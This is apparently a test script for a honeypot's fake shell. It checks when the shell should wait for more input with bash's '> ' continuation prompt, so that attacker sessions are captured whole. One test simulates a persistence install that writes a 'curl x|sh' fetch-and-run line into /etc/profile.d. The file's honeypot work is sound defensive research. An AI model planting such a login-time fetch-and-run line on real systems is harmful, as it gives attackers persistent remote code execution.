"""When the shell must answer with `> ` instead of running the line.

A honeypot exists to collect what the attacker meant to run, and almost
nothing worth collecting fits on one line. On 2026-08-28 at 13:23 a real
visitor typed

    if [ -d /etc/profile.d ]; then

and got a fresh prompt back. bash would have printed `> ` and waited, so
what they typed next -- the part that says what they wanted installed --
was never typed, and the capture is a single line of an `if` with no body.
The same session's automated half opens with the SA_OS_TYPE scanner's
four-line preamble, which had been arriving as four unrelated commands.

Two ways to be wrong here and they are not symmetric. Deciding a genuinely
incomplete command is complete runs a fragment and loses the rest. Deciding
a complete command is incomplete hangs the session at a prompt that never
returns, which no real shell does and an attacker cannot recover from
except with ^C. The second is much the worse, so most of what follows is
complete commands that a careless keyword scan would mistake for open ones.

Usage:  python3 ps2test.py
"""

import sys

import fakeshell

CHECKS, FAILS = [], []


def check(name, got, want, note=""):
    ok = got == want
    CHECKS.append(ok)
    if not ok:
        FAILS.append("FAIL %s\n  got  %r\n  want %r%s"
                     % (name, got, want, "\n  -- " + note if note else ""))


def waits(name, text, note=""):
    """bash would print PS2 for this."""
    check(name, bool(fakeshell.needs_more_input(text)), True, note)


def runs(name, text, note=""):
    """bash would run this as it stands."""
    check(name, fakeshell.needs_more_input(text), "", note)


# ------------------------------------------------------- opens a block
waits("if without fi", "if [ -d /etc/profile.d ]; then",
      "the exact line a visitor typed and got no continuation for")
waits("for without done", "for i in 1 2 3; do")
waits("while without done", "while true; do")
waits("until without done", "until false; do")
waits("select without done", "select x in a b; do")
waits("case without esac", "case $x in")
waits("function brace left open", "f() {")
waits("body typed, closer not", "if true; then\n  echo yes")
waits("inner block closed, outer not",
      "if true; then\n if true; then\n  echo x\n fi")

# ------------------------------------------------------------ heredocs
waits("heredoc delimiter never arrives", "cat <<EOF")
waits("heredoc with body but no delimiter", "cat <<EOF\nline one\nline two")
waits("quoted heredoc delimiter", "cat <<-'END'")
runs("heredoc closed", "cat <<EOF\nbody\nEOF")
runs("tab-stripped heredoc closed", "cat <<-END\n\tbody\n\tEND")
runs("herestring is not a heredoc", "grep x <<< \"$var\"",
     "<<< takes its word inline and never waits for a delimiter")

# -------------------------------------------------------------- quotes
waits("unterminated single quote", "echo 'unterminated")
waits("unterminated double quote", 'echo "unterminated')
waits("trailing backslash", "echo hi \\")
runs("both quotes closed", "echo 'a' \"b\"")
runs("apostrophe inside double quotes", 'echo "it is"')

# --------------------------------------------------- dangling operators
waits("line ends on &&", "echo a &&")
waits("line ends on ||", "echo a ||")
waits("line ends on |", "echo a |")
runs("&& with its right side", "echo a && echo b")
runs("pipeline is complete", "ls | grep x")
runs("longer pipeline", "echo a | grep b | wc -l")
runs("; ends a command", "ls; ls")
runs("trailing ; is complete", "HISTFILE=;",
     "the SA_OS_TYPE scanner's first line")

# ------------------------------- keywords that are only arguments (the
# ------------------------------- false positives that would hang a session
runs("done as an argument", "echo done")
runs("fi as an argument", "echo fi")
runs("esac as an argument", "echo esac")
runs("done inside its own loop", "while true; do\n  echo done\ndone",
     "a keyword scan that ignores command position closes the loop early "
     "on the echo and then runs a fragment")
runs("fi inside its own if", "if true; then\n  echo fi\nfi")
runs("keyword in a quoted string", "echo 'if true; then'")
runs("keyword in a comment", "# if true; then")
runs("comment after a command", "echo hi # done")
runs("hash inside quotes is not a comment", "echo '#notacomment'")

# ------------------------------------------------------ complete blocks
runs("one-line if", "if true; then echo yes; fi")
runs("multi-line if", "if [ -d /etc/profile.d ]; then\n  echo x\nfi")
runs("if/else", "if true; then\n echo a\nelse\n echo b\nfi")
runs("if/elif", "if true; then\n echo a\nelif false; then\n echo b\nfi")
runs("for closed", "for i in 1 2 3; do echo $i; done")
runs("case closed", "case $x in a) echo a;; esac",
     "the ) of a case pattern has no ( and must not unbalance anything")
runs("function closed", "f() {\n  echo hi\n}")
runs("command substitution", "echo $(date)")
runs("backtick substitution", "REAL_OS_NAME=`uname`",
     "the SA_OS_TYPE scanner's third line")
runs("plain command", "ls -la")
runs("empty input", "")

# -------------------------------------------- and it still runs, joined
sh = fakeshell.Shell(vfs=fakeshell.VFS(), peer="198.51.100.13",
                     peer_port=40333)
sh.run("true")


def out(text):
    o = sh.run(text)
    return ((o[0] if isinstance(o, tuple) else o) or "").strip()


check("a joined if runs its body",
      out("if [ -d /etc/profile.d ]; then\n  echo INSIDE\nfi"), "INSIDE")
check("a joined loop runs every iteration",
      out("for i in 1 2 3; do\n  echo n$i\ndone"), "n1\nn2\nn3")
check("a joined heredoc reaches the file",
      out("cat > /tmp/ps2probe.sh <<'EOF'\n#!/bin/sh\necho payload\nEOF\n"
          "cat /tmp/ps2probe.sh"), "#!/bin/sh\necho payload")
check("the whole persistence install is captured",
      out("if [ -d /etc/profile.d ]; then\n"
          "  echo 'curl x|sh' > /etc/profile.d/zz.sh\n"
          "  echo INSTALLED\nfi\ncat /etc/profile.d/zz.sh"),
      "INSTALLED\ncurl x|sh",
      "line by line this wrote nothing and reported nothing")

for f in FAILS:
    print(" ", f)
print("   ps2: %d checks, %d differ" % (len(CHECKS), len(FAILS)))
sys.exit(1 if FAILS else 0)
